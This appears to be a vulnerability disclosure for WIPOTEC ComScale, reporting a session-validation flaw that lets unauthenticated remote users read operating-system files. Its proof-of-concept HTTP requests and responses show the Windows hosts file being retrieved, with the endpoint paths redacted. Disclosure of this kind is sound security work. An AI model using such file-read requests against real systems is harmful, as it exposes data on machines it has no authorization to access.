Vulnerability Type: Incorrect Access Control
Vendor of the Product: WIPOTEC GmbH
Affected product: ComScale, tested on 4.3.29.21344 and 4.4.12.723
Attack Type: Remote
Affected Component: [REDACTED]
Impact: Information Disclosure
Description: ComScale fails to validate user sessions. Therefor remote unauthenticated attackers can read files from the underlying operating system and get directory listings.

```
Request:

GET [REDACTED] HTTP/1.1
Host: x.x.x.x
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://x.x.x.x/[REDACTED]
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ASP.NET_SessionId=sozf5x32z5vlqnltaupypptv
Connection: close

Response: 

HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 824
Content-Type: application/octet-stream; charset=utf-8
Server: Microsoft-IIS/10.0
content-disposition: attachment; filename="hosts"
X-AspNet-Version: 4.0.30319
X-UA-Compatible: IE=Edge
Date: Tue, 19 Sep 2023 13:54:35 GMT
Connection: close

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
```

```
Request:

POST [REDACTED] HTTP/1.1
Host: x.x.x.x
Content-Length: 15
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://x.x.x.x
Referer: http://x.x.x.x/[REDACTED]
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ASP.NET_SessionId=sozf5x32z5vlqnltaupypptv
Connection: close

[REDACTED]

Response:

HTTP/1.1 200 OK
Cache-Control: private, max-age=0
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-UA-Compatible: IE=Edge
Date: XXX
Connection: close
Content-Length: 1795

[REDACTED]
```
